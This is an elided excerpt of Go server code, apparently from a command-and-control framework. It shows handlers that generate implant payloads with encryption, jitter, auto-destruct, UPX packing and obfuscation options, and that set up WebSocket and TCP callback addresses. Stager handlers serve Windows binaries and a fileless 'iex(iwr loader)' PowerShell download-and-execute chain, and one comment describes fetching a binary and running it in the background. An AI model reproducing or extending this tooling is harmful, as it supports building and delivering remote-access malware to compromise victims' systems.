...
func HandleGenerate(c *gin.Context) {
	...
	if req.Method == "patch" {
		...
		case "WS", "WEBSOCKET":
			// Prefer /socket (PROFILE_DEFAULT); listener also catch-all upgrades any path
			c2url = fmt.Sprintf("ws://%s:%d/socket", host, ln.Port)
		case "WSS":
			c2url = fmt.Sprintf("wss://%s:%d/socket", host, ln.Port)
		case "TCP":
	...
	conf := services.PayloadConfig{
		OSType:            req.OS,
		Arch:              req.Arch,
		Protocol:          ln.Protocol, // Builder normalizes WebSocket/TCP/… + EnableTLS
		Host:              host,
		Port:              fmt.Sprintf("%d", ln.Port),
		AESKey:            req.AesKey, // already forced from ln.EncryptKey above
		AutoDestruct:      req.AutoDestruct,
		SleepTime:         req.SleepTime,
		UseUPX:            req.UseUPX,
		HeartbeatInterval: ln.HeartbeatInterval,
		EncryptionSalt:    req.EncryptionSalt,  // from ln
		ObfuscationMode:   req.ObfuscationMode, // from ln
		Jitter:            req.Jitter,
		Profile:           profile,
		EnableTLS:         ln.EnableTLS,
		TemplateMode:      false, // dynamic source build: inject URL/AES into config.rs
	}
...
func HandleGetStager(c *gin.Context) {
	...
	if osType == "windows" && delivery == "fileless" {
		...
		// Short one-liner: iex(iwr loader) — loader body served at /api/s/l/:id (HMAC token)
		loaderURL := fmt.Sprintf("%s://%s/api/s/l/%s?t=%s", httpProto, downloadHost, stage2ID, stagerguard.SignStagerID(stage2ID))
	...
	if osType == "windows" {
		...
		url64 := fmt.Sprintf("%s://%s/api/s/bin/%s?t=%s", httpProto, downloadHost, id64, stagerguard.SignStagerID(id64))
		url32 := fmt.Sprintf("%s://%s/api/s/bin/%s?t=%s", httpProto, downloadHost, id32, stagerguard.SignStagerID(id32))
		...
		batURL := fmt.Sprintf("%s://%s/api/s/%s?t=%s", httpProto, downloadHost, batID, stagerguard.SignStagerID(batID))
	...
	baseURL := fmt.Sprintf("%s://%s/api/s/%s?t=%s", httpProto, downloadHost, id, tok)
	// 拉二进制并后台执行；用 /api/s/bin 更稳（纯 bin，不依赖 polyglot）
	binURL := fmt.Sprintf("%s://%s/api/s/bin/%s?t=%s", httpProto, downloadHost, id, tok)
...
`, url64, url64, url32)
	...
	binaryURL := fmt.Sprintf("%s://%s/api/s/bin/%s?t=%s", protocol, c.Request.Host, id, stagerguard.SignStagerID(id))
...
func HandleServeFilelessLoader(c *gin.Context) {
	...
	stage2URL := fmt.Sprintf("%s://%s/api/stage2/%s?t=%s", proto, c.Request.Host, conf.Stage2ID, stagerguard.SignStagerID(conf.Stage2ID))
	stagerAudit(c, id, stagerguard.StatusOK)
